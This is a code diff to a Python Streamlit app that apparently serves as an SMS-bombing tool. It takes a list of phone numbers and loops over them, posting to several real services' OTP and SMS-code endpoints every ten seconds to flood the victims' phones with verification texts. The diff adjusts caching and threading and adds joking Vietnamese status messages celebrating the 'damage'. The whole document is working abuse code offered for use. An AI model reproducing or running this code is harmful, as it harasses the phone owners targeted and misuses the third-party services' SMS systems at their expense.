@@ -65,7 +65,7 @@ class App:
         '''
         components.html(script)
         st.markdown(script, unsafe_allow_html=True)
-    
+    @st.cache(suppress_st_warning=True)
     def spamPhone(self,arrPhone):
         sdt = arrPhone.split(",")
         i=0
@@ -86,19 +86,16 @@ class App:
                 requests.post("https://api.vmayman.com/app/member/sendSmsCode",json=pload)
                 pload = {"mobile": phone}
                 requests.post("https://wenvey.com/_api/auth/login/sms",data=pload)
-                pload = {"phone":phone}
-                requests.post("https://gateway.chotot.com/v2/public/auth/send_otp_verify",json=pload)
                 pload = {"mobile": phone}
                 requests.post("https://api.magpiecredit.com/user/sendCode-h5",data=pload)   
                 i+=1
                 if i==len(sdt):
                     i=0
+                st.success("Hàng tỉ sát thương >:")
             except:
                 st.error("Lỗi 1 phát... Nhưng Đừng Lo Nha Pé!")
             sleep(10)
-    @st.cache(suppress_st_warning=True)
     def runThreadSpam(self,arrPhone):
-        sleep(1)
         thread = threading.Thread(target=self.spamPhone,args=(arrPhone,))
         add_report_ctx(thread)
         thread.start()
@@ -131,9 +128,10 @@ class App:
                     break
             if checkPhone:
                 st.caption('Đang xiên...')
-                self.runThreadSpam(mobile_number)
+                # self.runThreadSpam(mobile_number)
                 st.success("Tới Công Chuyện Lun Pé Owi :))")
                 img = Image.open("tu.jpg")
+                self.spamPhone(mobile_number)
                 st.image(img,use_column_width=True)
             else:
                 self.javaScript()
